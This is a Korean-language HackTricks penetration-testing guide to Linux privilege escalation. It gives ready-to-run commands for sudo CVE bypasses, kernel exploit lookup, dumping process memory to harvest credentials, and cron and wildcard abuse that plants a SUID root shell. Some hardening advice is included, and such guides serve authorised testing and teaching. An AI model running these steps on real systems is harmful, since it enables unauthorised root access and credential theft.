# Linux 권한 상승

{{#include ../../../banners/hacktricks-training.md}}

더 폭넓은 배경 지식과 과거의 열거 워크플로를 알아보려면 참고 자료에 나열된 g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation, linux-private-i 자료를 살펴보세요.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## 시스템 정보

### OS 정보

먼저 실행 중인 OS에 대한 정보를 수집해 봅시다.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### 경로

**PATH** 변수에 포함된 폴더 중 하나라도 쓰기 권한이 있으면 일부 라이브러리나 바이너리를 하이재킹할 수 있습니다:

```bash
echo $PATH
```

### 환경 정보

환경 변수에 흥미로운 정보, 비밀번호 또는 API 키가 있나요?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

커널 버전을 확인하고 권한 상승에 사용할 수 있는 exploit이 있는지 확인합니다.

[Kernel/LPE/CVE section](../../main-system-information/kernel-lpe-cves/README.md)에는 로컬 권한 상승 사례와 Binary Exploitation의 심층 Linux 커널 분석 글 링크가 정리되어 있습니다. 사례를 테스트하기 전에 영향을 받는 빌드와 구성을 확인하세요.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

취약한 커널 목록과 이미 **컴파일된 exploit**는 여기서 확인할 수 있습니다: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 및 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
**컴파일된 exploit**를 찾을 수 있는 다른 사이트: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

해당 웹사이트에서 취약한 커널 버전을 모두 추출하려면 다음을 실행하세요:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

kernel exploit을 검색하는 데 도움이 될 수 있는 도구:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (피해 시스템에서 실행, kernel 2.x용 exploit만 확인)

항상 **Google에서 kernel 버전을 검색하세요.** 사용 중인 kernel 버전이 어떤 kernel exploit에 적혀 있을 수도 있습니다. 그러면 해당 exploit이 유효하다는 것을 확신할 수 있습니다.

추가 kernel exploitation 기술:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux 권한 상승 - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo 버전

다음에 나오는 취약한 sudo 버전을 기준으로 합니다:

```bash
searchsploit sudo
```

이 grep을 사용해 sudo 버전이 취약한지 확인할 수 있습니다.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14부터 1.9.17까지**는 sudo가 사용자가 제어하는 디렉터리에서 `/etc/nsswitch.conf`를 불러올 때 `--chroot` 옵션을 통해 권한이 없는 로컬 사용자가 root 권한으로 상승할 수 있게 합니다. upstream은 **1.9.17p1**에서 이 문제를 수정했습니다. `sudo -V`는 `PATH`에서 선택된 바이너리만 보고하므로, 관련 경로에 있는 root-setuid sudo 바이너리를 모두 확인하세요. 배포판 패키지는 upstream 버전 문자열을 바꾸지 않고도 수정 사항을 backport할 수 있으므로, vendor 패키지 상태도 확인하세요. [sudo maintainer의 권고문](https://www.openwall.com/lists/oss-security/2025/06/30/3)을 참고하세요.<sup>[[28]](#references)[[29]](#references)</sup>

다음은 해당 [취약점](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)을 악용하는 [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)입니다. exploit을 실행하기 전에 `sudo` 버전이 취약하고 `chroot` 기능을 지원하는지 확인하세요.

자세한 내용은 원본 [취약점 권고문](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)을 참고하세요.<sup>[[28]](#references)</sup>

### Sudo 호스트 기반 규칙 우회 (CVE-2025-32462)

Upstream sudo **1.8.8부터 1.9.17까지**는 호스트 기반 sudoers 규칙을 평가할 때 **실제 hostname** 대신 `sudo -h <host>`에 지정된 **사용자 제공 hostname**을 사용할 수 있습니다. upstream은 **1.9.17p1**에서 이 문제를 수정했습니다. 선택한 호스트에 일치하는 sudoers 항목이 있어야 합니다. vendor backport와 대체 sudo 바이너리도 로컬 정책과 함께 검토하세요. [sudo maintainer의 권고문](https://www.openwall.com/lists/oss-security/2025/06/30/2)을 참고하세요.<sup>[[29]](#references)</sup>

요구 사항:
- 취약한 sudo 버전
- 호스트별 sudoers 규칙 (호스트가 현재 hostname도 `ALL`도 아닌 경우)

sudoers 패턴 예시:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

허용된 호스트를 spoofing하여 exploit:

```bash
sudo -h devbox id
sudo -h devbox -i
```

선택한 이름의 resolution이 차단되는 경우, 해당 이름이 호스트에서 어떻게 resolution되는지 확인하세요. 로그나 구성 파일에서 이름을 보는 것만으로는 해당 이름이 resolution 가능하다고 할 수 없으며, `/etc/hosts`를 변경하려면 일반적으로 privileged write access가 필요합니다.

#### sudo < v1.8.28

이 [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287)는 root를 제외한 모든 사용자로 명령을 실행할 수 있도록 허용하는 유효한 sudo 규칙이 필요합니다. 예를 들면 `(ALL, !root) /bin/bash`와 같습니다. 호출자는 인증 요구 사항을 포함해 해당 규칙을 사용할 수 있어야 합니다. 설치된 패키지의 보안 권고를 확인하세요. 공급업체는 표시된 upstream 버전이 여전히 1.8.28 미만인 릴리스에도 수정 사항을 backport했습니다. `!root` 규칙이나 오래된 버전만으로는 취약성이 확인되지 않습니다. Passive enumeration 중에는 privileged command를 테스트하지 마세요.

```
sudo -u#-1 /bin/bash
```

### Dmesg 서명 검증 실패

이 취약점을 악용하는 **예시**는 HTB의 **smasher2 박스**를 확인하세요.

```bash
dmesg 2>/dev/null | grep "signature"
```

### 추가 시스템 열거

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## 가능한 방어책 열거

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

컨테이너 내부에 있다면 먼저 다음 컨테이너 보안 섹션을 확인한 다음 런타임별 악용 페이지로 이동하세요:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## 드라이브

**무엇이 어디에, 어떤 이유로 마운트되거나 마운트 해제되어 있는지** 확인하세요. 마운트 해제된 항목이 있다면 마운트한 다음 비공개 정보를 확인해 볼 수 있습니다.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## 유용한 소프트웨어

유용한 바이너리 열거하기

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

또한 **컴파일러가 설치되어 있는지 확인하세요**. kernel exploit을 사용해야 할 경우 유용합니다. 사용할 시스템(또는 유사한 시스템)에서 컴파일하는 것이 권장되기 때문입니다.

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### 취약한 소프트웨어 설치 여부

**설치된 패키지와 서비스의 버전**을 확인하세요. 악용하여 권한을 상승시킬 수 있는 오래된 Nagios 버전 등이 있을 수 있습니다…\
의심스러운 소프트웨어의 버전은 직접 확인하는 것이 좋습니다.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

머신에 대한 SSH 액세스 권한이 있다면 **openVAS**를 사용해 머신에 설치된 오래되었거나 취약한 소프트웨어를 확인할 수도 있습니다.

> [!NOTE] > _이 명령을 실행하면 대부분 쓸모없는 정보가 많이 표시됩니다. 따라서 OpenVAS와 같이 설치된 소프트웨어 버전 중 알려진 exploit에 취약한 것이 있는지 확인해 주는 애플리케이션을 사용하는 것이 좋습니다._

## 프로세스

실행 중인 **프로세스**를 살펴보고, 프로세스에 **필요 이상으로 많은 권한이 부여되어 있지는 않은지** 확인하세요(예를 들어 tomcat이 root로 실행되고 있는지?).

```bash
ps aux
ps -ef
top -n 1
```

항상 실행 중인 [**electron/cef/chromium debuggers**를 확인하세요. 이를 악용해 권한을 상승시킬 수 있습니다](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas**는 프로세스의 command line에서 `--inspect` 파라미터를 확인해 이를 탐지합니다.\
또한 프로세스 바이너리에 대한 권한도 **확인하세요**. 다른 사용자의 바이너리를 덮어쓸 수 있을지도 모릅니다.

### 사용자 간 부모-자식 프로세스 체인

부모 프로세스와 **다른 사용자**로 실행되는 자식 프로세스가 있다고 해서 반드시 악성인 것은 아니지만, 유용한 **triage 신호**입니다. 일부 사용자 전환은 예상된 동작입니다(`root`가 서비스 사용자를 생성하거나, 로그인 관리자가 세션 프로세스를 생성하는 경우 등). 하지만 특이한 체인은 wrapper, debug helper, persistence 또는 취약한 runtime 신뢰 경계를 드러낼 수 있습니다.

빠른 검토:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

놀라운 chain을 발견하면 parent command line과 동작에 영향을 주는 모든 파일(`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments)을 확인하세요. 실제 privesc 경로 중 상당수에서 child 자체는 쓰기 가능하지 않았지만, **parent가 제어하는 config** 또는 helper chain은 쓰기 가능했습니다.

### 삭제된 실행 파일 및 삭제된 상태로 열린 파일

Runtime artifacts는 삭제된 **후에도** 여전히 접근할 수 있는 경우가 많습니다. 이는 privilege escalation뿐 아니라 민감한 파일을 이미 열어 둔 process에서 증거를 복구하는 데도 유용합니다.

삭제된 실행 파일을 확인하세요:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

`/proc/<PID>/exe`가 `(deleted)`를 가리키더라도, 프로세스는 메모리에 있는 이전 바이너리 이미지를 계속 실행 중입니다. 이는 조사해 볼 만한 강력한 신호입니다. 이유는 다음과 같습니다.

- 제거된 실행 파일에 흥미로운 문자열이나 자격 증명이 포함되어 있을 수 있습니다
- 실행 중인 프로세스가 여전히 유용한 파일 디스크립터를 노출할 수 있습니다
- 삭제된 권한 상승 바이너리는 최근 변조 또는 정리 시도를 나타낼 수 있습니다

삭제된 채 열린 파일을 전체 시스템에서 수집합니다:

```bash
lsof +L1
```

흥미로운 디스크립터를 찾으면 바로 복구하세요:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

프로세스가 삭제된 secret, script, database export 또는 flag file을 아직 열어 둔 상태라면 특히 유용합니다.

### 프로세스 모니터링

프로세스를 모니터링하려면 [**pspy**](https://github.com/DominicBreuker/pspy) 같은 도구를 사용할 수 있습니다. 자주 실행되거나 특정 요구 사항이 충족될 때 실행되는 취약한 프로세스를 식별하는 데 매우 유용할 수 있습니다.

#### sudo를 통한 Linux ProcMon

[Linux용 ProcMon](https://github.com/microsoft/ProcMon-for-Linux)은 선택한 프로세스와 시스템 호출을 추적하고 SQLite trace로 저장할 수 있습니다. `sudo -l`에서 제한 없이 root 권한으로 실행할 수 있는 `procmon` 명령이 허용된다면, 다른 사용자의 프로세스 입력이나 출력을 관찰할 수 있는지 검토해 보세요. 이 권한은 검토를 시작할 단서일 뿐입니다. tracer 지원 여부, 실제 적용되는 정책, 적합한 프로세스의 활동 여부가 모두 중요합니다. trace 파일에 secrets가 포함될 수 있으므로 권한이 있는 export만 주의 깊게 확인하고, 관련 없는 프로세스는 수집하지 마세요.

### 프로세스 메모리

일부 서버 서비스는 **메모리에 credentials를 평문으로 저장합니다**.\
일반적으로 다른 사용자의 프로세스 메모리를 읽으려면 **root 권한**이 필요하므로, 이미 root 권한을 얻은 상태에서 추가 credentials를 찾을 때 더 유용합니다.\
하지만 **일반 사용자도 자신이 소유한 프로세스의 메모리는 읽을 수 있습니다**.

> [!WARNING]
> 요즘 대부분의 머신은 기본적으로 **ptrace를 허용하지 않으므로**, 권한이 없는 사용자가 소유한 다른 프로세스를 dump할 수 없습니다.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ 파일은 ptrace 접근성을 제어합니다.
>
> - **kernel.yama.ptrace_scope = 0**: 같은 uid를 가진 모든 프로세스를 디버깅할 수 있습니다. 이는 ptracing이 동작하던 전통적인 방식입니다.
> - **kernel.yama.ptrace_scope = 1**: 부모 프로세스만 디버깅할 수 있습니다.
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE capability가 필요하므로 관리자만 ptrace를 사용할 수 있습니다.
> - **kernel.yama.ptrace_scope = 3**: ptrace로 어떤 프로세스도 추적할 수 없습니다. 이 값으로 설정하면 ptracing을 다시 활성화하려면 재부팅해야 합니다.

잠시 동안 password vault를 잠금 해제하는 동일 UID 프로세스는 별도의 credential 경계가 될 수 있습니다. tracing이 허용되는 경우, 실행 중이며 dump 가능한 프로세스의 입력 syscall이나 메모리에서 vault password가 노출될 수 있습니다. 암호화된 vault 파일 자체는 계속 보호되더라도 마찬가지입니다. `ptrace_scope=0`은 여러 전제 조건 중 하나일 뿐입니다. 일치하는 credentials, 대상 프로세스의 dump 가능 여부, 그 밖의 Linux security module, 프로세스 실행 시간도 영향을 미칩니다. vault 항목을 Unix root 로그인에 사용할 수 있는지는 별도로 credential 재사용 여부를 확인해야 합니다. 일반적인 열거에서는 입력을 수집하거나 secrets를 출력하지 말고, 정책과 대상 후보 프로세스 또는 vault 경로를 보고해야 합니다. [kernel의 Yama 문서](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html)와 [ptrace 접근 확인](https://man7.org/linux/man-pages/man2/ptrace.2.html)을 참조하세요.

#### GDB

예를 들어 FTP 서비스의 메모리에 접근할 수 있다면 Heap을 가져와 그 안에서 credentials를 검색할 수 있습니다.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB 스크립트

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

주어진 프로세스 ID에 대해 **maps는 해당 프로세스의 가상 주소 공간에 메모리가 어떻게 매핑되어 있는지** 보여 줍니다. 또한 **각 매핑 영역의 권한**도 표시합니다. **mem** 의사 파일은 **프로세스의 메모리 자체를 노출합니다**. **maps** 파일을 통해 **읽을 수 있는 메모리 영역**과 해당 영역의 오프셋을 알 수 있습니다. 이 정보를 사용해 **mem 파일에서 해당 위치로 이동한 다음, 읽을 수 있는 모든 영역을 파일로 덤프합니다**.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem`은 시스템의 **물리** 메모리에 접근할 수 있게 합니다. 가상 메모리가 아닙니다. 커널의 가상 주소 공간은 /dev/kmem을 사용해 접근할 수 있습니다.\
일반적으로 `/dev/mem`은 **root**와 **kmem** 그룹만 읽을 수 있습니다.

```
strings /dev/mem -n10 | grep -i PASS
```

### Linux용 ProcDump

ProcDump는 Windows용 Sysinternals 도구 모음에 포함된 기존 ProcDump 도구를 Linux용으로 재구현한 도구입니다. [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)에서 다운로드하세요.

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### 도구

프로세스 메모리를 덤프하려면 다음을 사용할 수 있습니다.

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root 권한 요구 사항을 수동으로 제거하고 자신이 소유한 프로세스를 덤프할 수 있습니다
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf)의 Script A.5 (root가 필요합니다)

### 프로세스 메모리에서 자격 증명 가져오기

#### 수동 예시

authenticator 프로세스가 실행 중인 것을 발견했다면:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

프로세스를 덤프한 다음(프로세스 메모리를 덤프하는 여러 방법은 앞의 섹션을 참조) 메모리에서 자격 증명을 검색할 수 있습니다:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

도구 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)는 메모리와 일부 **잘 알려진 파일**에서 **평문 자격 증명을 탈취**합니다. 제대로 작동하려면 root 권한이 필요합니다.

| 기능                                              | 프로세스 이름         |
| ------------------------------------------------- | -------------------- |
| GDM 비밀번호 (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (활성 FTP 연결)                            | vsftpd               |
| Apache2 (활성 HTTP Basic Auth 세션)               | apache2              |
| OpenSSH (활성 SSH 세션 - Sudo 사용)               | sshd:                |

#### 검색 정규식/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## 예약된/Cron 작업

### root로 실행되는 Crontab UI (alseambusher) – 웹 기반 스케줄러 privesc

웹 “Crontab UI” 패널(alseambusher/crontab-ui)이 root로 실행되며 loopback에만 바인딩되어 있어도, SSH 로컬 포트 포워딩을 통해 접근한 뒤 권한이 높은 작업을 생성하여 권한을 상승시킬 수 있습니다.<sup>[[1]](#references)[[4]](#references)</sup>

일반적인 과정
- `ss -ntlp` / `curl -v localhost:8000`을 사용해 loopback 전용 포트(예: 127.0.0.1:8000)와 Basic-Auth realm을 찾습니다.
- 운영 관련 파일에서 자격 증명을 찾습니다.
  - `zip -P <password>`가 포함된 백업/스크립트
  - `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`를 노출하는 systemd 유닛
- 터널을 연결하고 로그인합니다:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 높은 권한의 작업을 생성하고 즉시 실행합니다 (SUID shell을 설치함):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 사용하세요:
```bash
/tmp/rootshell -p   # root shell
```

강화
- Crontab UI를 root로 실행하지 말고, 전용 사용자와 최소 권한으로 제한하세요.
- localhost에 바인딩하고 방화벽/VPN으로 추가 제한하세요. 비밀번호를 재사용하지 마세요.
- unit 파일에 secret을 넣지 마세요. secret store 또는 root만 읽을 수 있는 EnvironmentFile을 사용하세요.
- 요청 시 실행되는 job에 대해 audit/logging을 활성화하세요.

예약된 job 중 취약한 것이 있는지 확인하세요. root로 실행되는 script를 악용할 수 있을지도 모릅니다(wildcard vuln? root가 사용하는 파일을 수정할 수 있는지? symlink를 사용할 수 있는지? root가 사용하는 디렉터리에 특정 파일을 만들 수 있는지?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

`run-parts`가 사용되는 경우 실제로 실행될 이름을 확인하세요:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

이는 false positive를 방지합니다. 쓰기 가능한 주기적 디렉터리는 payload 파일 이름이 로컬 `run-parts` 규칙과 일치해야만 유용합니다.

### Cron 경로

예를 들어, _/etc/crontab_ 안에서 PATH를 찾을 수 있습니다: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_user 사용자가 /home/user에 대한 쓰기 권한을 가지고 있다는 점에 유의하세요_)

이 crontab에서 root 사용자가 경로를 설정하지 않고 명령이나 스크립트를 실행하려 한다고 가정해 보겠습니다. 예를 들어: _\* \* \* \* root overwrite.sh_\
그러면 다음을 사용해 root shell을 얻을 수 있습니다:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### 와일드카드가 포함된 스크립트를 사용하는 Cron (Wildcard Injection)

root가 스크립트를 실행하고, 그 안의 명령에 “**\***”가 포함되어 있다면 이를 악용해 예상치 못한 작업(예: privesc)을 수행할 수 있습니다. 예:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**와일드카드 앞에** _**/some/path/\***_ **처럼 경로가 있으면 취약하지 않습니다(심지어** _**./\***_ **도 취약하지 않습니다).**

와일드카드 악용 기법은 다음 페이지를 참고하세요:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron 로그 파서의 Bash 산술 확장 인젝션

Bash 산술 연산은 신뢰할 수 없는 텍스트를 식으로 해석할 수 있습니다. 영향을 받는 Bash 환경에서는 해당 식 안의 배열 인덱스가 command substitution을 실행할 수 있습니다. 권한이 있는 cron/parser가 공격자가 제어하는 로그 텍스트를 산술 비교에 넣으면, substitution이 parser의 권한으로 실행될 수 있습니다.<sup>[[22]](#references)</sup> 이는 정확한 Bash 식과 버전에 따라 달라집니다. 확장된 변수에 단순히 `$(...)0` 문자열을 넣는 것만으로는 재평가가 확실히 일어난다고 볼 수 없습니다.

입력은 파일 메타데이터나 사용자가 쓸 수 있는 위치에서 읽는 다른 필드에서 가져올 수도 있습니다. 예를 들어, 이미지의 `Producer` 태그를 읽고 `[[ "$producer" -eq "expected" ]]`로 비교하는 권한 있는 정리 스크립트는 변수가 따옴표로 묶여 있더라도 산술 비교를 수행합니다. 예약 작업이 실행되는 계정, 태그를 제공할 수 있는 파일, 비교 전의 변환 과정, 그리고 정확한 Bash 동작을 확인하세요. 텍스트 레이블에는 문자열 비교를 사용하고, 숫자에는 산술 연산을 하기 전에 입력값이 십진수 숫자인지 확인하세요. [Bash 산술 연산 규칙](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html)을 참고하세요.

- 일반적인 취약 패턴:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- 배열 첨자 메커니즘의 안전한 로컬 동작 확인(특권 프로세스나 파일 변경 없음):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

실제로 예약 실행되는 스크립트와 해당 스크립트가 여는 입력 경로를 확인하세요. 로그 파일 자체에 쓰기 권한이 없더라도, sticky bit가 설정되지 않은 상위 디렉터리에 쓰기 및 탐색 권한이 있는 사용자는 해당 디렉터리 항목을 바꿀 수 있습니다. `namei -l`을 사용하면 이러한 권한을 구분하는 데 도움이 됩니다. 다른 쓰기 가능한 로그 경로, 읽을 수 없는 스케줄러, 또는 해당 필드를 Bash 산술식으로 평가하지 않는 파서는 이 경로의 취약성을 입증하지 않습니다.

### Cron 스크립트 덮어쓰기 및 symlink

root로 실행되는 cron 스크립트를 **수정할 수 있다면**, 아주 쉽게 shell을 얻을 수 있습니다:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

root가 실행하는 스크립트가 **완전히 접근할 수 있는 디렉터리**를 사용한다면, 해당 폴더를 삭제하고 당신이 제어하는 스크립트가 있는 다른 폴더를 가리키는 **심볼릭 링크를 만들면** 유용할 수 있습니다.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### 심볼릭 링크 검증 및 안전한 파일 처리

경로를 통해 파일을 읽거나 쓰는 권한이 높은 스크립트/바이너리를 검토할 때는 링크가 어떻게 처리되는지 확인하세요.

- `stat()`은 심볼릭 링크를 따라가 대상의 메타데이터를 반환합니다.
- `lstat()`은 링크 자체의 메타데이터를 반환합니다.
- `readlink -f`와 `namei -l`은 최종 대상을 확인하고 각 경로 구성 요소의 권한을 보여줍니다.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

방어자/개발자는 symlink 트릭에 대비해 다음과 같은 더 안전한 패턴을 사용할 수 있습니다.

- `O_EXCL`과 `O_CREAT`: 경로가 이미 있으면 실패합니다(공격자가 미리 만든 링크/파일을 차단).
- `openat()`: 신뢰할 수 있는 디렉터리 파일 디스크립터를 기준으로 작업합니다.
- `mkstemp()`: 안전한 권한으로 임시 파일을 원자적으로 생성합니다.

### 쓰기 가능한 payload가 있는 커스텀 서명 cron 바이너리
root cron 작업이 실행하는 특정 바이너리에 일반 사용자가 쓸 수 있다면 권한 경계를 넘을 수 있지만, 커스텀 서명 검사는 서명되지 않은 교체 바이너리를 거부할 수 있습니다. 문서화된 사례에서는 root 소유 ELF의 모드가 `0760`이어서 그룹 구성원이 파일을 수정할 수 있었고, root 소유자는 실행할 수 있었습니다. 프로세스 추적에서 작업이 바이너리를 실행하기 전에 `objcopy`가 `.text_sig`를 추출하는 것을 확인할 수 있었지만, 검증기 스크립트 전체를 읽을 수는 없었습니다.<sup>[[2]](#references)</sup>

